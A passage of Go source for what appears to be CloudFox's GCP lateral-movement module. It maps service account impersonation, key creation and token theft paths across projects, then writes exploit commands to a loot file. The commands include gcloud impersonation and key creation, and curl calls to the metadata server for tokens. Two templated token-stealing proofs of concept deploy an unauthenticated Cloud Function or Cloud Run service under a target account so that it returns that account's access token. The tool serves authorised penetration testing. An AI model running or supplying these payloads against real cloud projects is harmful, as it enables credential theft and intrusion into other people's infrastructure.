package commands

import (
	"context"
	"fmt"
	"strings"
	"sync"

	attackpathservice "github.com/BishopFox/cloudfox/gcp/services/attackpathService"
	CloudRunService "github.com/BishopFox/cloudfox/gcp/services/cloudrunService"
	ComputeEngineService "github.com/BishopFox/cloudfox/gcp/services/computeEngineService"
	FunctionsService "github.com/BishopFox/cloudfox/gcp/services/functionsService"
	GKEService "github.com/BishopFox/cloudfox/gcp/services/gkeService"
	IAMService "github.com/BishopFox/cloudfox/gcp/services/iamService"
	"github.com/BishopFox/cloudfox/gcp/shared"
	"github.com/BishopFox/cloudfox/globals"
	"github.com/BishopFox/cloudfox/internal"
	gcpinternal "github.com/BishopFox/cloudfox/internal/gcp"
	"github.com/spf13/cobra"
)

// Module name constant
const GCP_LATERALMOVEMENT_MODULE_NAME string = "lateral-movement"

var GCPLateralMovementCommand = &cobra.Command{
	Use:     GCP_LATERALMOVEMENT_MODULE_NAME,
	Aliases: []string{"lateral", "pivot"},
	Short:   "Map lateral movement paths, credential theft vectors, and pivot opportunities",
	Long: `Identify lateral movement opportunities within and across GCP projects.

Features:
- Maps service account impersonation chains (SA → SA → SA)
- Identifies token creator permissions (lateral movement via impersonation)
- Finds cross-project access paths
- Detects VM metadata abuse vectors
- Analyzes credential storage locations (secrets, environment variables)
- Maps attack paths from compromised identities
- Generates exploitation commands for penetration testing

This module helps identify how an attacker could move laterally after gaining
initial access to a GCP environment.`,
	Run: runGCPLateralMovementCommand,
}

// ------------------------------
// Module Struct
// ------------------------------
type LateralMovementModule struct {
	gcpinternal.BaseGCPModule

	// All lateral movement paths using centralized AttackPath struct
	AllPaths     []attackpathservice.AttackPath
	ProjectPaths map[string][]attackpathservice.AttackPath // projectID -> paths
	LootMap      map[string]map[string]*internal.LootFile  // projectID -> loot files
	mu           sync.Mutex
}

// ------------------------------
// Output Struct
// ------------------------------
type LateralMovementOutput struct {
	Table []internal.TableFile
	Loot  []internal.LootFile
}

func (o LateralMovementOutput) TableFiles() []internal.TableFile { return o.Table }
func (o LateralMovementOutput) LootFiles() []internal.LootFile   { return o.Loot }

// ------------------------------
// Command Entry Point
// ------------------------------
func runGCPLateralMovementCommand(cmd *cobra.Command, args []string) {
	cmdCtx, err := gcpinternal.InitializeCommandContext(cmd, GCP_LATERALMOVEMENT_MODULE_NAME)
	if err != nil {
		return
	}

	module := &LateralMovementModule{
		BaseGCPModule: gcpinternal.NewBaseGCPModule(cmdCtx),
		AllPaths:      []attackpathservice.AttackPath{},
		ProjectPaths:  make(map[string][]attackpathservice.AttackPath),
		LootMap:       make(map[string]map[string]*internal.LootFile),
	}

	module.Execute(cmdCtx.Ctx, cmdCtx.Logger)
}

// ------------------------------
// Module Execution
// ------------------------------
func (m *LateralMovementModule) Execute(ctx context.Context, logger internal.Logger) {
	logger.InfoM("Mapping lateral movement paths...", GCP_LATERALMOVEMENT_MODULE_NAME)

	var usedCache bool

	// Check if attack path analysis was already run (via --attack-paths flag)
	if cache := gcpinternal.GetAttackPathCacheFromContext(ctx); cache != nil && cache.HasRawData() {
		if cachedResult, ok := cache.GetRawData().(*attackpathservice.CombinedAttackPathData); ok {
			logger.InfoM("Using cached attack path analysis results", GCP_LATERALMOVEMENT_MODULE_NAME)
			m.loadFromCachedData(cachedResult)
			usedCache = true
		}
	}

	// If no context cache, try loading from disk cache
	if !usedCache {
		diskCache, metadata, err := gcpinternal.LoadAttackPathCacheFromFile(m.OutputDirectory, m.Account)
		if err == nil && diskCache != nil && diskCache.HasRawData() {
			if cachedResult, ok := diskCache.GetRawData().(*attackpathservice.CombinedAttackPathData); ok {
				logger.InfoM(fmt.Sprintf("Using disk cache (created: %s, projects: %v)",
					metadata.CreatedAt.Format("2006-01-02 15:04:05"), metadata.ProjectsIn), GCP_LATERALMOVEMENT_MODULE_NAME)
				m.loadFromCachedData(cachedResult)
				usedCache = true
			}
		}
	}

	// If no cached data, run full analysis
	if !usedCache {
		logger.InfoM("Running lateral movement analysis...", GCP_LATERALMOVEMENT_MODULE_NAME)

		// Analyze org and folder level lateral movement paths (runs once for all projects)
		m.analyzeOrgFolderLateralPaths(ctx, logger)

		// Process each project
		m.RunProjectEnumeration(ctx, logger, m.ProjectIDs, GCP_LATERALMOVEMENT_MODULE_NAME, m.processProject)

		// Consolidate all paths
		for _, paths := range m.ProjectPaths {
			m.AllPaths = append(m.AllPaths, paths...)
		}

		// Save to disk cache for future use (run full analysis for all attack types)
		// Skip if running under all-checks (consolidated save happens at the end)
		m.saveToAttackPathCache(ctx, logger)
	}

	// Check results
	if len(m.AllPaths) == 0 {
		logger.InfoM("No lateral movement paths found", GCP_LATERALMOVEMENT_MODULE_NAME)
		return
	}

	// Count by category for summary
	categoryCounts := make(map[string]int)
	for _, path := range m.AllPaths {
		categoryCounts[path.Category]++
	}

	logger.SuccessM(fmt.Sprintf("Found %d lateral movement path(s)", len(m.AllPaths)), GCP_LATERALMOVEMENT_MODULE_NAME)

	m.writeOutput(ctx, logger)
}

// loadFromCachedData loads lateral movement paths from cached attack path data
func (m *LateralMovementModule) loadFromCachedData(data *attackpathservice.CombinedAttackPathData) {
	// Filter to only include lateral paths
	for _, path := range data.AllPaths {
		if path.PathType == "lateral" {
			m.AllPaths = append(m.AllPaths, path)
			// Also organize by project
			if path.ScopeType == "project" && path.ScopeID != "" {
				m.ProjectPaths[path.ScopeID] = append(m.ProjectPaths[path.ScopeID], path)
			} else if path.ScopeType == "organization" {
				m.ProjectPaths["organization"] = append(m.ProjectPaths["organization"], path)
			} else if path.ScopeType == "folder" {
				m.ProjectPaths["folder"] = append(m.ProjectPaths["folder"], path)
			}
		}
	}
}

// saveToAttackPathCache saves attack path data to disk cache
func (m *LateralMovementModule) saveToAttackPathCache(ctx context.Context, logger internal.Logger) {
	// Skip saving if running under all-checks (consolidated save happens at the end)
	if gcpinternal.IsAllChecksMode(ctx) {
		logger.InfoM("Skipping individual cache save (all-checks mode)", GCP_LATERALMOVEMENT_MODULE_NAME)
		return
	}

	// Run full analysis (all types) so we can cache for other modules
	svc := attackpathservice.New()
	fullResult, err := svc.CombinedAttackPathAnalysis(ctx, m.ProjectIDs, m.ProjectNames, "all")
	if err != nil {
		logger.InfoM(fmt.Sprintf("Could not run full attack path analysis for caching: %v", err), GCP_LATERALMOVEMENT_MODULE_NAME)
		return
	}

	cache := gcpinternal.NewAttackPathCache()

	// Populate cache with paths from all scopes
	var pathInfos []gcpinternal.AttackPathInfo
	for _, path := range fullResult.AllPaths {
		pathInfos = append(pathInfos, gcpinternal.AttackPathInfo{
			Principal:     path.Principal,
			PrincipalType: path.PrincipalType,
			Method:        path.Method,
			PathType:      gcpinternal.AttackPathType(path.PathType),
			Category:      path.Category,
			RiskLevel:     path.RiskLevel,
			Target:        path.TargetResource,
			Permissions:   path.Permissions,
			ScopeType:     path.ScopeType,
			ScopeID:       path.ScopeID,
		})
	}
	cache.PopulateFromPaths(pathInfos)
	cache.SetRawData(fullResult)

	// Save to disk
	err = gcpinternal.SaveAttackPathCacheToFile(cache, m.ProjectIDs, m.OutputDirectory, m.Account, "1.0")
	if err != nil {
		logger.InfoM(fmt.Sprintf("Could not save attack path cache: %v", err), GCP_LATERALMOVEMENT_MODULE_NAME)
	} else {
		privesc, exfil, lateral := cache.GetStats()
		logger.InfoM(fmt.Sprintf("Saved attack path cache to disk (%d privesc, %d exfil, %d lateral)",
			privesc, exfil, lateral), GCP_LATERALMOVEMENT_MODULE_NAME)
	}
}

// analyzeOrgFolderLateralPaths analyzes organization and folder level IAM for lateral movement permissions
func (m *LateralMovementModule) analyzeOrgFolderLateralPaths(ctx context.Context, logger internal.Logger) {
	attackSvc := attackpathservice.New()

	// Analyze organization-level IAM
	orgPaths, orgNames, _, err := attackSvc.AnalyzeOrganizationAttackPaths(ctx, "lateral")
	if err != nil {
		if globals.GCP_VERBOSITY >= globals.GCP_VERBOSE_ERRORS {
			gcpinternal.HandleGCPError(err, logger, GCP_LATERALMOVEMENT_MODULE_NAME, "Could not analyze organization-level lateral movement paths")
		}
	} else if len(orgPaths) > 0 {
		logger.InfoM(fmt.Sprintf("Found %d organization-level lateral movement path(s)", len(orgPaths)), GCP_LATERALMOVEMENT_MODULE_NAME)
		for i := range orgPaths {
			orgName := orgNames[orgPaths[i].ScopeID]
			if orgName == "" {
				orgName = orgPaths[i].ScopeID
			}
			// Update the path with org context
			orgPaths[i].ScopeName = orgName
			orgPaths[i].RiskLevel = "CRITICAL" // Org-level is critical
			orgPaths[i].PathType = "lateral"
		}
		m.mu.Lock()
		m.ProjectPaths["organization"] = append(m.ProjectPaths["organization"], orgPaths...)
		m.mu.Unlock()
	}

	// Analyze folder-level IAM
	folderPaths, folderNames, err := attackSvc.AnalyzeFolderAttackPaths(ctx, "lateral")
	if err != nil {
		if globals.GCP_VERBOSITY >= globals.GCP_VERBOSE_ERRORS {
			gcpinternal.HandleGCPError(err, logger, GCP_LATERALMOVEMENT_MODULE_NAME, "Could not analyze folder-level lateral movement paths")
		}
	} else if len(folderPaths) > 0 {
		logger.InfoM(fmt.Sprintf("Found %d folder-level lateral movement path(s)", len(folderPaths)), GCP_LATERALMOVEMENT_MODULE_NAME)
		for i := range folderPaths {
			folderName := folderNames[folderPaths[i].ScopeID]
			if folderName == "" {
				folderName = folderPaths[i].ScopeID
			}
			// Update the path with folder context
			folderPaths[i].ScopeName = folderName
			folderPaths[i].RiskLevel = "CRITICAL" // Folder-level is critical
			folderPaths[i].PathType = "lateral"
		}
		m.mu.Lock()
		m.ProjectPaths["folder"] = append(m.ProjectPaths["folder"], folderPaths...)
		m.mu.Unlock()
	}
}

// ------------------------------
// Project Processor
// ------------------------------
func (m *LateralMovementModule) initializeLootForProject(projectID string) {
	if m.LootMap[projectID] == nil {
		m.LootMap[projectID] = make(map[string]*internal.LootFile)
		m.LootMap[projectID]["lateral-movement-commands"] = &internal.LootFile{
			Name:     "lateral-movement-commands",
			Contents: "# Lateral Movement Exploit Commands\n# Generated by CloudFox\n\n",
		}
	}
}

func (m *LateralMovementModule) generatePlaybook() *internal.LootFile {
	// Use centralized playbook generation from attackpathService
	return &internal.LootFile{
		Name:     "lateral-movement-playbook",
		Contents: attackpathservice.GenerateLateralPlaybook(m.AllPaths, ""),
	}
}


func (m *LateralMovementModule) processProject(ctx context.Context, projectID string, logger internal.Logger) {
	if globals.GCP_VERBOSITY >= globals.GCP_VERBOSE_ERRORS {
		logger.InfoM(fmt.Sprintf("Analyzing lateral movement paths in project: %s", projectID), GCP_LATERALMOVEMENT_MODULE_NAME)
	}

	m.mu.Lock()
	m.initializeLootForProject(projectID)
	m.mu.Unlock()

	// 1. Find impersonation chains
	m.findImpersonationChains(ctx, projectID, logger)

	// 2. Find token theft vectors (compute instances, functions, etc.)
	m.findTokenTheftVectors(ctx, projectID, logger)

	// 3. Find permission-based lateral movement paths
	m.findPermissionBasedLateralPaths(ctx, projectID, logger)
}

// findImpersonationChains finds service account impersonation paths
func (m *LateralMovementModule) findImpersonationChains(ctx context.Context, projectID string, logger internal.Logger) {
	iamService := IAMService.New()

	// Get all service accounts
	serviceAccounts, err := iamService.ServiceAccounts(projectID)
	if err != nil {
		m.CommandCounter.Error++
		gcpinternal.HandleGCPError(err, logger, GCP_LATERALMOVEMENT_MODULE_NAME,
			fmt.Sprintf("Could not get service accounts in project %s", projectID))
		return
	}

	// For each SA, check who can impersonate it using GetServiceAccountIAMPolicy
	for _, sa := range serviceAccounts {
		impersonationInfo, err := iamService.GetServiceAccountIAMPolicy(ctx, sa.Email, projectID)
		if err != nil {
			continue
		}

		// Token creators can impersonate
		for _, creator := range impersonationInfo.TokenCreators {
			// Skip allUsers/allAuthenticatedUsers - those are handled separately
			if shared.IsPublicPrincipal(creator) {
				continue
			}

			riskLevel := "HIGH"
			// If target SA has roles/owner or roles/editor, it's critical
			if impersonationInfo.RiskLevel == "CRITICAL" {
				riskLevel = "CRITICAL"
			}

			path := attackpathservice.AttackPath{
				Principal:      creator,
				PrincipalType:  shared.GetPrincipalType(creator),
				Method:         "Impersonate (Get Token)",
				TargetResource: sa.Email,
				Permissions:    []string{"iam.serviceAccounts.getAccessToken"},
				Category:       "Service Account Impersonation",
				RiskLevel:      riskLevel,
				Description:    fmt.Sprintf("%s can impersonate %s", creator, sa.Email),
				ExploitCommand: fmt.Sprintf("gcloud auth print-access-token --impersonate-service-account=%s", sa.Email),
				ProjectID:      projectID,
				ScopeType:      "project",
				ScopeID:        projectID,
				ScopeName:      m.GetProjectName(projectID),
				PathType:       "lateral",
			}

			m.mu.Lock()
			m.ProjectPaths[projectID] = append(m.ProjectPaths[projectID], path)
			m.addPathToLoot(path, projectID)
			m.mu.Unlock()
		}

		// Key creators can create persistent access
		for _, creator := range impersonationInfo.KeyCreators {
			if shared.IsPublicPrincipal(creator) {
				continue
			}

			path := attackpathservice.AttackPath{
				Principal:      creator,
				PrincipalType:  shared.GetPrincipalType(creator),
				Method:         "Create Key",
				TargetResource: sa.Email,
				Permissions:    []string{"iam.serviceAccountKeys.create"},
				Category:       "Service Account Key Creation",
				RiskLevel:      "CRITICAL",
				Description:    fmt.Sprintf("%s can create keys for %s", creator, sa.Email),
				ExploitCommand: fmt.Sprintf("gcloud iam service-accounts keys create key.json --iam-account=%s", sa.Email),
				ProjectID:      projectID,
				ScopeType:      "project",
				ScopeID:        projectID,
				ScopeName:      m.GetProjectName(projectID),
				PathType:       "lateral",
			}

			m.mu.Lock()
			m.ProjectPaths[projectID] = append(m.ProjectPaths[projectID], path)
			m.addPathToLoot(path, projectID)
			m.mu.Unlock()
		}
	}
}

// findTokenTheftVectors finds compute resources where tokens can be stolen
func (m *LateralMovementModule) findTokenTheftVectors(ctx context.Context, projectID string, logger internal.Logger) {
	// Find Compute Engine instances with service accounts
	m.findComputeInstanceVectors(ctx, projectID, logger)

	// Find Cloud Functions with service accounts
	m.findCloudFunctionVectors(ctx, projectID, logger)

	// Find Cloud Run services with service accounts
	m.findCloudRunVectors(ctx, projectID, logger)

	// Find GKE clusters with node service accounts
	m.findGKEVectors(ctx, projectID, logger)
}

// findComputeInstanceVectors finds compute instances where tokens can be stolen via metadata server
func (m *LateralMovementModule) findComputeInstanceVectors(ctx context.Context, projectID string, logger internal.Logger) {
	computeService := ComputeEngineService.New()

	instances, err := computeService.Instances(projectID)
	if err != nil {
		// Don't count as error - API may not be enabled
		if globals.GCP_VERBOSITY >= globals.GCP_VERBOSE_ERRORS {
			gcpinternal.HandleGCPError(err, logger, GCP_LATERALMOVEMENT_MODULE_NAME,
				fmt.Sprintf("Could not get compute instances in project %s", projectID))
		}
		return
	}

	for _, instance := range instances {
		// Skip instances without service accounts
		if len(instance.ServiceAccounts) == 0 {
			continue
		}

		for _, sa := range instance.ServiceAccounts {
			// Skip default compute SA if it has no useful scopes
			if sa.Email == "" {
				continue
			}

			path := attackpathservice.AttackPath{
				Principal:      instance.Name,
				PrincipalType:  "compute_instance",
				Method:         "Steal Token (Metadata)",
				TargetResource: sa.Email,
				Permissions:    []string{"compute.instances.get", "compute.instances.osLogin"},
				Category:       "Compute Instance Token Theft",
				RiskLevel:      "HIGH",
				Description:    fmt.Sprintf("Access to instance %s allows stealing token for %s", instance.Name, sa.Email),
				ExploitCommand: fmt.Sprintf(`# SSH into instance and steal token
gcloud compute ssh %s --zone=%s --project=%s --command='curl -s -H "Metadata-Flavor: Google" "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"'`,
					instance.Name, instance.Zone, projectID),
				ProjectID: projectID,
				ScopeType: "project",
				ScopeID:   projectID,
				ScopeName: m.GetProjectName(projectID),
				PathType:  "lateral",
			}

			m.mu.Lock()
			m.ProjectPaths[projectID] = append(m.ProjectPaths[projectID], path)
			m.addPathToLoot(path, projectID)
			m.mu.Unlock()
		}
	}
}

// findCloudFunctionVectors finds Cloud Functions where tokens can be stolen
func (m *LateralMovementModule) findCloudFunctionVectors(ctx context.Context, projectID string, logger internal.Logger) {
	functionsService := FunctionsService.New()

	functions, err := functionsService.Functions(projectID)
	if err != nil {
		if globals.GCP_VERBOSITY >= globals.GCP_VERBOSE_ERRORS {
			gcpinternal.HandleGCPError(err, logger, GCP_LATERALMOVEMENT_MODULE_NAME,
				fmt.Sprintf("Could not get Cloud Functions in project %s", projectID))
		}
		return
	}

	for _, fn := range functions {
		if fn.ServiceAccount == "" {
			continue
		}

		// Generate exploit with PoC code, deploy command, and invoke command
		exploitCmd := fmt.Sprintf(`# Target: Cloud Function %s
# Service Account: %s
# Region: %s

# Step 1: Create token exfiltration function code
mkdir -p /tmp/token-theft-%s && cd /tmp/token-theft-%s

cat > main.py << 'PYEOF'
import functions_framework
import requests

@functions_framework.http
def steal_token(request):
    # Fetch SA token from metadata server
    token_url = "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"
    headers = {"Metadata-Flavor": "Google"}
    resp = requests.get(token_url, headers=headers)
    token_data = resp.json()

    # Fetch SA email
    email_url = "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email"
    email_resp = requests.get(email_url, headers=headers)

    return {
        "service_account": email_resp.text,
        "access_token": token_data.get("access_token"),
        "token_type": token_data.get("token_type"),
        "expires_in": token_data.get("expires_in")
    }
PYEOF

cat > requirements.txt << 'REQEOF'
functions-framework==3.*
requests==2.*
REQEOF

# Step 2: Deploy function with target SA (requires cloudfunctions.functions.create + iam.serviceAccounts.actAs)
gcloud functions deploy token-theft-poc \
    --gen2 \
    --runtime=python311 \
    --region=%s \
    --source=. \
    --entry-point=steal_token \
    --trigger-http \
    --allow-unauthenticated \
    --service-account=%s \
    --project=%s

# Step 3: Invoke function to get token
curl -s $(gcloud functions describe token-theft-poc --region=%s --project=%s --format='value(url)')

# Cleanup
gcloud functions delete token-theft-poc --region=%s --project=%s --quiet`,
			fn.Name, fn.ServiceAccount, fn.Region,
			fn.Name, fn.Name,
			fn.Region, fn.ServiceAccount, projectID,
			fn.Region, projectID,
			fn.Region, projectID)

		path := attackpathservice.AttackPath{
			Principal:      fn.Name,
			PrincipalType:  "cloud_function",
			Method:         "Steal Token (Function)",
			TargetResource: fn.ServiceAccount,
			Permissions:    []string{"cloudfunctions.functions.create", "iam.serviceAccounts.actAs"},
			Category:       "Cloud Function Token Theft",
			RiskLevel:      "HIGH",
			Description:    fmt.Sprintf("Cloud Function %s runs with SA %s", fn.Name, fn.ServiceAccount),
			ExploitCommand: exploitCmd,
			ProjectID:      projectID,
			ScopeType:      "project",
			ScopeID:        projectID,
			ScopeName:      m.GetProjectName(projectID),
			PathType:       "lateral",
		}

		m.mu.Lock()
		m.ProjectPaths[projectID] = append(m.ProjectPaths[projectID], path)
		m.addPathToLoot(path, projectID)
		m.mu.Unlock()
	}
}

// findCloudRunVectors finds Cloud Run services where tokens can be stolen
func (m *LateralMovementModule) findCloudRunVectors(ctx context.Context, projectID string, logger internal.Logger) {
	cloudRunService := CloudRunService.New()

	services, err := cloudRunService.Services(projectID)
	if err != nil {
		if globals.GCP_VERBOSITY >= globals.GCP_VERBOSE_ERRORS {
			gcpinternal.HandleGCPError(err, logger, GCP_LATERALMOVEMENT_MODULE_NAME,
				fmt.Sprintf("Could not get Cloud Run services in project %s", projectID))
		}
		return
	}

	for _, svc := range services {
		if svc.ServiceAccount == "" {
			continue
		}

		// Generate exploit with PoC code, deploy command, and invoke command
		exploitCmd := fmt.Sprintf(`# Target: Cloud Run Service %s
# Service Account: %s
# Region: %s

# Step 1: Create token exfiltration container
mkdir -p /tmp/cloudrun-theft-%s && cd /tmp/cloudrun-theft-%s

cat > main.py << 'PYEOF'
from flask import Flask, jsonify
import requests
import os

app = Flask(__name__)

@app.route("/")
def steal_token():
    # Fetch SA token from metadata server
    token_url = "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"
    headers = {"Metadata-Flavor": "Google"}
    resp = requests.get(token_url, headers=headers)
    token_data = resp.json()

    # Fetch SA email
    email_url = "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email"
    email_resp = requests.get(email_url, headers=headers)

    return jsonify({
        "service_account": email_resp.text,
        "access_token": token_data.get("access_token"),
        "token_type": token_data.get("token_type"),
        "expires_in": token_data.get("expires_in")
    })

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 8080)))
PYEOF

cat > requirements.txt << 'REQEOF'
flask==3.*
requests==2.*
gunicorn==21.*
REQEOF

cat > Dockerfile << 'DOCKEOF'
FROM python:3.11-slim
WORKDIR /app
COPY requirements.txt .
RUN pip install --no-cache-dir -r requirements.txt
COPY main.py .
CMD exec gunicorn --bind :$PORT --workers 1 --threads 8 --timeout 0 main:app
DOCKEOF

# Step 2: Build and push container
gcloud builds submit --tag gcr.io/%s/token-theft-poc --project=%s

# Step 3: Deploy Cloud Run service with target SA (requires run.services.create + iam.serviceAccounts.actAs)
gcloud run deploy token-theft-poc \
    --image gcr.io/%s/token-theft-poc \
    --region=%s \
    --service-account=%s \
    --allow-unauthenticated \
    --project=%s

# Step 4: Invoke service to get token
curl -s $(gcloud run services describe token-theft-poc --region=%s --project=%s --format='value(status.url)')

# Cleanup
gcloud run services delete token-theft-poc --region=%s --project=%s --quiet
gcloud container images delete gcr.io/%s/token-theft-poc --quiet --force-delete-tags`,
			svc.Name, svc.ServiceAccount, svc.Region,
			svc.Name, svc.Name,
			projectID, projectID,
			projectID, svc.Region, svc.ServiceAccount, projectID,
			svc.Region, projectID,
			svc.Region, projectID,
			projectID)

		path := attackpathservice.AttackPath{
			Principal:      svc.Name,
			PrincipalType:  "cloud_run",
			Method:         "Steal Token (Container)",
			TargetResource: svc.ServiceAccount,
			Permissions:    []string{"run.services.create", "iam.serviceAccounts.actAs"},
			Category:       "Cloud Run Token Theft",
			RiskLevel:      "HIGH",
			Description:    fmt.Sprintf("Cloud Run service %s runs with SA %s", svc.Name, svc.ServiceAccount),
			ExploitCommand: exploitCmd,
			ProjectID:      projectID,
			ScopeType:      "project",
			ScopeID:        projectID,
			ScopeName:      m.GetProjectName(projectID),
			PathType:       "lateral",
		}

		m.mu.Lock()
		m.ProjectPaths[projectID] = append(m.ProjectPaths[projectID], path)
		m.addPathToLoot(path, projectID)
		m.mu.Unlock()
	}
}

// findGKEVectors finds GKE clusters/node pools where tokens can be stolen
func (m *LateralMovementModule) findGKEVectors(ctx context.Context, projectID string, logger internal.Logger) {
	gkeService := GKEService.New()

	clusters, nodePools, err := gkeService.Clusters(projectID)
	if err != nil {
		if globals.GCP_VERBOSITY >= globals.GCP_VERBOSE_ERRORS {
			gcpinternal.HandleGCPError(err, logger, GCP_LATERALMOVEMENT_MODULE_NAME,
				fmt.Sprintf("Could not get GKE clusters in project %s", projectID))
		}
		return
	}

	// Track cluster SAs to avoid duplicates in node pools
	clusterSAs := make(map[string]string) // clusterName -> SA

	for _, cluster := range clusters {
		// Check node service account
		if cluster.NodeServiceAccount != "" {
			clusterSAs[cluster.Name] = cluster.NodeServiceAccount

			var exploitCmd string
			if cluster.WorkloadIdentity != "" {
				exploitCmd = fmt.Sprintf(`# Cluster uses Workload Identity - tokens are pod-specific
# Get credentials for cluster:
gcloud container clusters get-credentials %s --location=%s --project=%s
# Then exec into a pod and check for mounted SA token:
kubectl exec -it <pod> -- cat /var/run/secrets/kubernetes.io/serviceaccount/token`,
					cluster.Name, cluster.Location, projectID)
			} else {
				exploitCmd = fmt.Sprintf(`# Cluster uses node SA (no Workload Identity) - all pods can access node SA
gcloud container clusters get-credentials %s --location=%s --project=%s
# Exec into any pod and steal node SA token:
kubectl exec -it <pod> -- curl -s -H "Metadata-Flavor: Google" "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"`,
					cluster.Name, cluster.Location, projectID)
			}

			path := attackpathservice.AttackPath{
				Principal:      cluster.Name,
				PrincipalType:  "gke_cluster",
				Method:         "Steal Token (Pod)",
				TargetResource: cluster.NodeServiceAccount,
				Permissions:    []string{"container.clusters.getCredentials", "container.pods.exec"},
				Category:       "GKE Cluster Token Theft",
				RiskLevel:      "HIGH",
				Description:    fmt.Sprintf("GKE cluster %s uses node SA %s", cluster.Name, cluster.NodeServiceAccount),
				ExploitCommand: exploitCmd,
				ProjectID:      projectID,
				ScopeType:      "project",
				ScopeID:        projectID,
				ScopeName:      m.GetProjectName(projectID),
				PathType:       "lateral",
			}

			m.mu.Lock()
			m.ProjectPaths[projectID] = append(m.ProjectPaths[projectID], path)
			m.addPathToLoot(path, projectID)
			m.mu.Unlock()
		}
	}

	// Process node pools with different SAs than their cluster
	for _, np := range nodePools {
		clusterSA := clusterSAs[np.ClusterName]
		if np.ServiceAccount == "" || np.ServiceAccount == clusterSA {
			continue // Skip if same as cluster SA or empty
		}

		exploitCmd := fmt.Sprintf(`# Node pool %s uses specific SA
gcloud container clusters get-credentials %s --location=%s --project=%s
# Exec into pod running on this node pool and steal token`,
			np.Name, np.ClusterName, np.Location, projectID)

		path := attackpathservice.AttackPath{
			Principal:      fmt.Sprintf("%s/%s", np.ClusterName, np.Name),
			PrincipalType:  "gke_nodepool",
			Method:         "Steal Token (Pod)",
			TargetResource: np.ServiceAccount,
			Permissions:    []string{"container.clusters.getCredentials", "container.pods.exec"},
			Category:       "GKE Node Pool Token Theft",
			RiskLevel:      "HIGH",
			Description:    fmt.Sprintf("GKE node pool %s/%s uses SA %s", np.ClusterName, np.Name, np.ServiceAccount),
			ExploitCommand: exploitCmd,
			ProjectID:      projectID,
			ScopeType:      "project",
			ScopeID:        projectID,
			ScopeName:      m.GetProjectName(projectID),
			PathType:       "lateral",
		}

		m.mu.Lock()
		m.ProjectPaths[projectID] = append(m.ProjectPaths[projectID], path)
		m.addPathToLoot(path, projectID)
		m.mu.Unlock()
	}
}

// findPermissionBasedLateralPaths identifies principals with lateral movement permissions
// This uses the centralized attackpathService for project and resource-level analysis
func (m *LateralMovementModule) findPermissionBasedLateralPaths(ctx context.Context, projectID string, logger internal.Logger) {
	// Use attackpathService for project-level analysis
	attackSvc := attackpathservice.New()

	projectName := m.GetProjectName(projectID)
	paths, err := attackSvc.AnalyzeProjectAttackPaths(ctx, projectID, projectName, "lateral")
	if err != nil {
		gcpinternal.HandleGCPError(err, logger, GCP_LATERALMOVEMENT_MODULE_NAME,
			fmt.Sprintf("Could not analyze lateral movement permissions for project %s", projectID))
		return
	}

	// Store paths directly (they're already AttackPath type)
	m.mu.Lock()
	m.ProjectPaths[projectID] = append(m.ProjectPaths[projectID], paths...)
	m.mu.Unlock()

	// Also analyze resource-level IAM
	resourcePaths, err := attackSvc.AnalyzeResourceAttackPaths(ctx, projectID, "lateral")
	if err != nil {
		if globals.GCP_VERBOSITY >= globals.GCP_VERBOSE_ERRORS {
			gcpinternal.HandleGCPError(err, logger, GCP_LATERALMOVEMENT_MODULE_NAME,
				fmt.Sprintf("Could not analyze resource-level lateral movement permissions for project %s", projectID))
		}
	} else {
		m.mu.Lock()
		m.ProjectPaths[projectID] = append(m.ProjectPaths[projectID], resourcePaths...)
		m.mu.Unlock()
	}
}

// ------------------------------
// Loot File Management
// ------------------------------
func (m *LateralMovementModule) addPathToLoot(path attackpathservice.AttackPath, projectID string) {
	lootFile := m.LootMap[projectID]["lateral-movement-commands"]
	if lootFile == nil {
		return
	}
	lootFile.Contents += fmt.Sprintf(
		"# Method: %s\n"+
			"# Category: %s\n"+
			"# Principal: %s (%s)\n"+
			"# Target: %s\n"+
			"# Permissions: %s\n"+
			"%s\n\n",
		path.Method,
		path.Category,
		path.Principal, path.PrincipalType,
		path.TargetResource,
		strings.Join(path.Permissions, ", "),
		path.ExploitCommand,
	)
}

// ------------------------------
// Output Generation
// ------------------------------
func (m *LateralMovementModule) writeOutput(ctx context.Context, logger internal.Logger) {
	if m.Hierarchy != nil && !m.FlatOutput {
		m.writeHierarchicalOutput(ctx, logger)
	} else {
		m.writeFlatOutput(ctx, logger)
	}
}

func (m *LateralMovementModule) getHeader() []string {
	return []string{
		"Project",
		"Source",
		"Principal Type",
		"Principal",
		"Method",
		"Target Resource",
		"Category",
		"Binding Scope",
		"Permissions",
	}
}

func (m *LateralMovementModule) pathsToTableBody(paths []attackpathservice.AttackPath) [][]string {
	var body [][]string
	for _, path := range paths {
		scopeName := path.ScopeName
		if scopeName == "" {
			scopeName = path.ScopeID
		}

		// Format binding scope (where the IAM binding is defined)
		bindingScope := "Project"
		if path.ScopeType == "organization" {
			bindingScope = "Organization"
		} else if path.ScopeType == "folder" {
			bindingScope = "Folder"
		} else if path.ScopeType == "resource" {
			bindingScope = "Resource"
		}

		body = append(body, []string{
			scopeName,
			path.ScopeType,
			path.PrincipalType,
			path.Principal,
			path.Method,
			path.TargetResource,
			path.Category,
			bindingScope,
			strings.Join(path.Permissions, ", "),
		})
	}
	return body
}

func (m *LateralMovementModule) buildTablesForProject(projectID string) []internal.TableFile {
	var tableFiles []internal.TableFile

	if paths, ok := m.ProjectPaths[projectID]; ok && len(paths) > 0 {
		tableFiles = append(tableFiles, internal.TableFile{
			Name:   "lateral-movement",
			Header: m.getHeader(),
			Body:   m.pathsToTableBody(paths),
		})
	}

	return tableFiles
}

func (m *LateralMovementModule) writeHierarchicalOutput(ctx context.Context, logger internal.Logger) {
	outputData := internal.HierarchicalOutputData{
		OrgLevelData:     make(map[string]internal.CloudfoxOutput),
		ProjectLevelData: make(map[string]internal.CloudfoxOutput),
	}

	// Generate playbook once for all projects
	playbook := m.generatePlaybook()

	for projectID := range m.ProjectPaths {
		tableFiles := m.buildTablesForProject(projectID)

		var lootFiles []internal.LootFile
		if projectLoot, ok := m.LootMap[projectID]; ok {
			for _, loot := range projectLoot {
				if loot != nil && loot.Contents != "" && !strings.HasSuffix(loot.Contents, "# Generated by CloudFox\n\n") {
					lootFiles = append(lootFiles, *loot)
				}
			}
		}

